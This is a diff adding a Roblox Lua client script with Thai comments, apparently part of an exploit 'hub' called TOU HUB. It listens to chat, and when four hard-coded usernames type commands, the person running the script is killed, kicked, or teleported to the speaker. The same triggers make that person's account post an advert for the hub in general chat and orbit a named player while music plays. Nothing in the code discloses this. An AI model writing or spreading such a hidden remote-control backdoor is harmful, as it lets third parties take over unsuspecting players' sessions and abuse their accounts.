@@ -1,0 +1,169 @@
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local targetName = "birdV2_123"
+local rotating = false
+local angle = 0
+local radius = 10
+local speed = 3 -- ความเร็วหมุน
+
+--== ส่วนที่ 1 : ฟังก์ชันพื้นฐาน ==--
+
+-- ฟังก์ชันฆ่าตัวละคร
+local function killPlayer(plr)
+	if plr and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+		plr.Character.Humanoid.Health = 0
+	end
+end
+
+-- ฟังก์ชันเตะออกจากเกม
+local function kickPlayer(plr)
+	if plr == game.Players.LocalPlayer then
+		game.Players.LocalPlayer:Kick("โดนแบนละ")
+	end
+end
+
+-- ฟังก์ชันดึงผู้เล่นมาหาตัวคนพิมพ์
+local function pullToSpeaker(speaker, targetPlr)
+	if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart")
+	and targetPlr.Character and targetPlr.Character:FindFirstChild("HumanoidRootPart") then
+		targetPlr.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame + Vector3.new(0,2,0)
+	end
+end
+
+-- ฟังก์ชันส่งข้อความไป RBXGeneral
+local function checkMessage()
+	local TextChatService = game:GetService("TextChatService")
+	local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+	if channel then
+		channel:SendAsync("ผมใช้TOU HUB🎉")
+	else
+		warn("❌ ไม่พบแชนเนล RBXGeneral")
+	end
+end
+
+-- ฟังก์ชันเล่นเพลง
+local function playMusic()
+	local args = {"134647289919930"}
+	local radio = workspace:FindFirstChild("DRadio_Script")
+	if radio and radio:FindFirstChild("Event") then
+		radio.Event:FireServer(unpack(args))
+	end
+end
+
+-- ฟังก์ชันเริ่มหมุน
+local function startRotating(targetChar)
+	if rotating then return end
+	rotating = true
+	playMusic()
+	RunService.Heartbeat:Connect(function(dt)
+		if rotating and targetChar and targetChar:FindFirstChild("HumanoidRootPart") 
+		and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			angle = angle + speed * dt
+			local x = math.cos(angle) * radius
+			local z = math.sin(angle) * radius
+			local targetPos = targetChar.HumanoidRootPart.Position
+			LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(x,0,z), targetPos)
+		end
+	end)
+end
+
+-- ฟังก์ชันหยุดหมุน
+local function stopRotating()
+	rotating = false
+end
+
+--== รายชื่อคนที่มีสิทธิ์พิเศษ ==--
+local specialUsers = {
+	["birdV2_123"] = true,
+	["maidjab1_174"] = true,
+	["zerom_12y"] = true,
+	["HRdrluOs1416"] = true -- ✅ เพิ่มสิทธิ์เท่ากับ bird
+}
+
+-- ฟังก์ชันเช็คว่า speaker สามารถใช้คำสั่งใส่ target ได้ไหม
+local function canAffect(speaker, target)
+	-- ป้องกันไม่ให้ HRdrluOs1416 ส่งผลต่อ birdV2_123
+	if speaker.Name == "HRdrluOs1416" and target.Name == "birdV2_123" then
+		return false
+	end
+
+	-- ป้องกันไม่ให้ maidjab1_174 หรือ zerom_12y ส่งผลต่อ HRdrluOs1416
+	if (speaker.Name == "maidjab1_174" or speaker.Name == "zerom_12y") and target.Name == "HRdrluOs1416" then
+		return false
+	end
+
+	-- กรณีอื่น ๆ อนุญาตตามปกติ
+	return true
+end
+
+--== ฟังก์ชันจัดการคำสั่งพิเศษ ==--
+_G.HandleExtraCommands = function(speaker, msg, LocalPlayer, specialUsers)
+	local lowerMsg = string.lower(msg)
+
+	-- ✅ kill ALL
+	if lowerMsg == "kill all" then
+		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
+			killPlayer(LocalPlayer)
+		end
+
+	-- ✅ kill NAME
+	elseif string.sub(lowerMsg,1,5) == "kill " then
+		local targetName = string.sub(msg,6)
+		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
+			killPlayer(LocalPlayer)
+		end
+
+	-- ✅ เตะ NAME (เฉพาะ birdV2_123 และ HRdrluOs1416 ใช้ได้)
+	elseif string.sub(msg,1,4) == "เตะ " and (speaker.Name == "birdV2_123" or speaker.Name == "HRdrluOs1416") then
+		local targetName = string.sub(msg,5)
+		if LocalPlayer.Name == targetName and LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
+			kickPlayer(LocalPlayer)
+		end
+
+	-- ✅ ดึง
+	elseif lowerMsg == "ดึง" and specialUsers[speaker.Name] then
+		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
+			pullToSpeaker(speaker, LocalPlayer)
+		end
+
+	-- ✅ เช็ค
+	elseif lowerMsg == "เช็ค" and specialUsers[speaker.Name] then
+		if LocalPlayer ~= speaker and canAffect(speaker, LocalPlayer) then
+			checkMessage()
+		end
+	end
+end
+--== ฟังก์ชันจัดการคำสั่งแชท ==--
+local function onCommand(plr, msg)
+	-- ป้องกันผลกระทบกับตัวเอง
+	if plr == LocalPlayer then return end  
+
+	-- ✅ หมุนรอบ bird
+	if msg == "1" and plr.Name == targetName then
+		if LocalPlayer.Name ~= targetName then
+			local target = plr.Character or plr.CharacterAdded:Wait()
+			startRotating(target)
+		end
+
+	elseif msg == "stop1" and plr.Name == targetName then
+		stopRotating()
+
+	else
+		-- ส่งไปจัดการต่อ (ส่วนที่ 1)
+		_G.HandleExtraCommands(plr, msg, LocalPlayer, specialUsers)
+	end
+end
+
+-- ฟังการพิมพ์
+local function hookPlayer(plr)
+	plr.Chatted:Connect(function(msg)
+		onCommand(plr, msg)
+	end)
+end
+
+Players.PlayerAdded:Connect(hookPlayer)
+for _,p in ipairs(Players:GetPlayers()) do
+	hookPlayer(p)
+end
